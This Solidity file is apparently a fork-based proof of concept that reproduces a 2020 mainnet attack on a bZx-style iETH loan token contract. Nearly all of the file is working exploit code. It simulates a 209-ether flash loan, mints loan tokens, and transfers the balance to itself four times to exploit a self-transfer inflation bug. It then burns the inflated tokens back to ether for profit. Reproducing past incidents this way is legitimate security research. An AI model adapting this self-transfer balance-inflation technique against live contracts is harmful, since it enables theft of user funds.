// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// import "../basetest.sol";
// import "../interface.sol";

// @KeyInfo - Total Lost :
// Attacker : https://etherscan.io/address/0xd1c0f1316140D6bF1a9e2Eea8a227dAD151F69b7
// Vulnerable Contract : https://etherscan.io/address/0xb983e01458529665007ff7e0cddecdb74b967eb6
// Attack Tx : https://etherscan.io/tx/0x85dc2a433fd9eaadaf56fd8156c956da23fc17e5ef83955c7e2c4c37efa20bb5

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xde744d544a9d768e96c21b5f087fc54b776e9b25#code

// @Analysis
// Twitter Guy : https://x.com/0xCommodity/status/1305354469354303488


interface CheatCodes {
    function createSelectFork(string memory chainName, uint256 blockNumber) external;
    function deal(address to, uint256 amount) external;

}

interface ILoanTokenLogicWeth {
    function mintWithEther(address to) external payable;
    function burnToEther(address to, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external;
}

contract Exploit {

    function run() public returns (uint256) {
        CheatCodes vm = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

        uint256 blocknumToForkFrom = 10_852_716 - 1;

        ILoanTokenLogicWeth loanToken = ILoanTokenLogicWeth(0xB983E01458529665007fF7E0CDdeCDB74B967Eb6);

        vm.createSelectFork("mainnet",blocknumToForkFrom);
        uint256 before_balance = address(this).balance;
        // vm.createSelectFork(blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        address fundingToken = address(0x0);
        //implement exploit code here
        vm.deal(address(this), 209 ether); //simulation flashloan
        loanToken.mintWithEther{value: 209 ether}(address(this));

        // transfer token to myself repeatedly
        for (int256 i = 0; i < 4; i++) {
            uint256 balance = loanToken.balanceOf(address(this));
            loanToken.transfer(address(this), balance);
        }

        uint256 balance = loanToken.balanceOf(address(this));
        loanToken.burnToEther(address(this), balance);

        payable(address(0x0)).transfer(209 ether); //simulation replay flashloan

        uint256 after_balance = address(this).balance;
        return after_balance - before_balance;
    }

    fallback() external payable {}
}
